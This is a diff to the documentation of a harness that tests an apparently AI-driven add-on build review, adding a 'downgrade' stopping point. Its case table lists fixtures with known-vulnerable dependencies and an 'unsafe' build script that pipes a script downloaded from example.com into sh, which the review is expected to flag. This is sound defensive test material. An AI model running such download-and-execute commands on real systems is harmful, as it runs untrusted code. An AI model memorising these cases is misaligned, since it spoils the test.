@@ -10,11 +10,14 @@ WEBEXT_LINTER_AGENT_BUILDS=1 node verify.js <submission folder> --llm-sca-review
 and follows every prompt with real tools: it extracts the archive, writes build.md, judges
 the build, and hands back. The linter audits the lock against OSV, and the agent rescues the
 copy with the real npm or pnpm and builds the add-on, as the prompts say. The agent hands
-back until it reaches one of two stops, and goes no further:
+back until it reaches one of three stops, and goes no further:
 
 - **row 14:** the Build Review Details block, the first step of `built`. The agent shows the
   block, ends its turn on it, and goes no further.
 - **the abort:** the closing prompt of an aborted review. The agent stops on it.
+- **the downgrade:** an aborted review whose XPI could be reviewed alone does not close. It
+  asks whether to restart as an XPI review. The agent stops on that question and does not
+  answer it.
 
 Then it runs `check.js` on the work folder, so the verdict is the linter's state, not the
 agent's word.
@@ -30,7 +33,7 @@ of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
 1. Pick a case from `cases.json`. Its `submission` folder holds one `.xpi` and one source
    archive. Delete any work folder an earlier run left in it.
 2. Give the agent the command above with that folder. It works through the prompts until
-   row 14 or the abort.
+   row 14, the abort or the downgrade question.
 3. Run the check with the work folder the prompts named (the folder the `--llm-handback`
    commands carry):
 
@@ -42,8 +45,9 @@ of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
    cannot read the case or the folder.
 
 `check.js` reads the review's state (`.review/state.json`) through the linter's own
-readers. At row 14 it compares `SCA_BUILD_SAFETY_ASSESSMENT`, the counts of `SCA_VULNERABILITIES` the case
-names (each exact, or `{ "atLeast": n }`), `LLM_BUILD_RESULT` (`null` where the block shows none), the folder `LLM_BUILD_OUTPUT` lies in (always `build`, or `false` where
+readers. At row 14 it compares `SCA_BUILD_SAFETY_ASSESSMENT`, the counts of `SCA_VULNERABILITIES` (the
+submitted lock) and `LLM_RESCUED_VULNERABILITIES` (the rescued copy) the case names (each exact,
+or `{ "atLeast": n }`), `LLM_BUILD_RESULT` (`null` where the block shows none), the folder `LLM_BUILD_OUTPUT` lies in (always `build`, or `false` where
 the block names none) and the folder `SCA_ROOT` lies in (`sca` or `rescued`). It prints
 `LLM_BUILD_XPI_MATCH` and never compares it, since a case's lock is newer than the one its XPI was
 built from. Whatever the
@@ -51,7 +55,8 @@ stop, a `rescued/` in the work folder must hold no `node_modules/`, since nothin
 or built in it. At an
 abort it compares `LLM_BUILD_RESULT` and the counts of `LLM_RESCUED_VULNERABILITIES` the case
 names, settles the review as the closing prompt does, and compares the early-exit reasons
-(as a set) and the error findings the case names. A run that stopped anywhere else, in the
+(as a set) and the error findings the case names. At the downgrade question it reads the
+settled review the same way. A run that stopped anywhere else, in the
 preparation (`.review/prepare.json`) or at another phase, is a mismatch naming where it
 stopped. Package versions are never compared.
 
@@ -116,7 +121,7 @@ safety concern, and the case would end as judged unsafe instead of failed.
 | husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
 | moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
 | unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | 0 high, 0 critical | row 14: not built, judged unsafe |
-| not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | abort: build issues (`sca-lock-file-multiple`) |
+| not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | downgrade: build process issues (`sca-lock-file-multiple`) |
 | pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` (the pnpm commands) |
 
 Each case, and why it lands where it does:
@@ -147,7 +152,8 @@ Each case, and why it lands where it does:
 - **unsafe:** the build script pipes a downloaded script into `sh`. The URL is never fetched:
   the judgement ends the preparation before anything runs.
 - **not-auditable:** two lock files. The preparation does not audit such a lock, and the
-  review aborts on `sca-lock-file-multiple`. Both locks are empty, so no vulnerability check
+  review aborts on `sca-lock-file-multiple`. That check opts in to the downgrade and the XPI
+  is readable, so the review stops at the question whether to restart as an XPI review. Both locks are empty, so no vulnerability check
   adds a reason, whatever the agent judges the Makefile's submodule fetch to be.
 
 To rebuild a case: extract the base's original archive into an empty folder, rename its top
